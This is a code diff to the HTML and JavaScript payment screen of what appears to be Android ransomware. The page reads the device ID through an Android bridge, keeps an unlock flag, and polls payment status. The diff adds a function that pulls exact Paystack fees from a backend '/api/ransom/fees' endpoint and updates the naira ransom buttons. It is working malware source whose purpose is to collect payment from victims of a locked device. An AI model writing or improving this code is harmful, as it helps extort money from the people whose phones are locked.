@@ -137,7 +137,8 @@ button,input { font:inherit; }
         </div>
     </section>
 
-    <section class="pay-grid">
+    <section class="pay-grid" id="payGrid">
+        <!-- Buttons will be populated by JS with exact amounts -->
         <button class="pay-btn" onclick="payAmount(200)">₦ 200</button>
         <button class="pay-btn" onclick="payAmount(500)">₦ 500</button>
         <button class="pay-btn" onclick="payAmount(1000)">₦ 1,000</button>
@@ -209,6 +210,26 @@ let deviceId = Android.getDeviceId();
 let hasUnlocked = false;
 let isSyncing = false;
 
+// Fetch the exact Paystack fees from the backend and update the buttons
+function loadExactFees() {
+    fetch(`${BACKEND_URL}/api/ransom/fees`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                // Update the buttons with the exact total charge
+                const btns = document.querySelectorAll('.pay-btn');
+                const baseAmounts = [200, 500, 1000, 2000, 3000, 4000, 5000, 6000];
+                btns.forEach((btn, index) => {
+                    const base = baseAmounts[index];
+                    const exact = data.fees[base.toString()];
+                    if (exact) {
+                        btn.innerText = `₦ ${exact.toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: 2})}`;
+                    }
+                });
+            }
+        }).catch(e => console.log("Fee load error:", e));
+}
+
 function checkPaymentStatus() {
     if (hasUnlocked) return;
     
@@ -244,6 +265,7 @@ function checkPaymentStatus() {
 }
 
 window.onload = function() {
+    loadExactFees(); // Load the exact fees immediately
     setTimeout(checkPaymentStatus, 1000);
     setTimeout(checkPaymentStatus, 3000);
 };
